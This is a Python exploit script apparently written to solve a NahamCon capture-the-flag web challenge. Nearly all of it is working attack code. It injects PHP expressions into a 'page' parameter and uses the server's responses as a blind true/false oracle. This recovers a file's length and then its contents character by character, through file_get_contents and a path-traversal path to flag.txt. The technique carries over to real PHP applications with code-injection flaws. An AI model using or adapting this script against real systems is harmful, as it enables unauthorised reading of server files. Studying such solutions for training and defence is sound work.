import base64
import string
import requests
import urllib

url = "http://challenge.nahamcon.com:31146/"


def check(payload):
    params = urllib.parse.urlencode({'page': payload})
    r = requests.get(url, params=params)
    print(r.text)
    return "HACKING" not in r.text


base = "', 'qwer') === false && %s && strpos('1"
#get size of the text
def get_len(path):
    i = 10
    while True:
        payload = 'strlen(file_get_contents("%s")) <= %d' % (path, i)
        if check(base % payload):
            for j in range(i-10, i):
                payload = 'strlen(file_get_contents("%s")) == %d' % (path, j)
                if check(base % payload):
                    print ("Found Length = %d" % j)
                    return j
        i += 10

def read_file_contents(path):
    length = get_len(path)
    print(length)
    s = ""
    while len(s) < length:
        for c in string.printable:
            tmp = s + c
            print("tmp "+tmp)
            data_bytes = tmp.encode("UTF-8")
            #print("base64.b64encode(data_bytes) "+base64.b64encode(data_bytes))
            payload = ('substr(file_get_contents("%s"), 0, %d) == base64_decode("%s")' % (path, len(tmp), base64.b64encode(data_bytes).decode()))

            if check(base % payload):
                s += c
                break
    print(s)

print(read_file_contents('../../../../../../flag.txt'))
